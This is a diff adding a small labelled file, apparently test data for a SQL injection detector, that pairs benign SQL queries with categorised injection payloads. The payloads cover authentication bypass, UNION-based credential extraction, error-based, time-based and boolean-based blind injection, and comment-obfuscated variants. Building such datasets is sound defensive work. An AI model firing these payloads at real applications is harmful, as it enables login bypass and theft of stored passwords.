@@ -1,0 +1,28 @@
+Benign Queries
+SELECT * FROM users WHERE id = 1;
+SELECT name, email FROM customers;
+UPDATE products SET price = 100 WHERE id = 5;
+INSERT INTO logs (msg) VALUES ('hello');
+DELETE FROM orders WHERE id = 10;
+SELECT COUNT(*) FROM accounts;
+
+Basic Authentication Bypass Payloads
+' OR '1'='1
+" OR "1"="1" --
+
+UNION-Based SQL Injection
+' UNION SELECT NULL, NULL --
+1 UNION SELECT username, password FROM users --
+
+Error-Based SQL Injection
+1' GROUP BY CONCAT(username, ':', password) --
+
+Time-Based Blind SQL Injection
+' OR pg_sleep(5) --
+
+Boolean-Based Blind SQLi
+" AND 'x'='x' --
+
+Payloads Hidden Inside Comments
+1/**/UNION/**/SELECT/**/NULL,NULL --
+
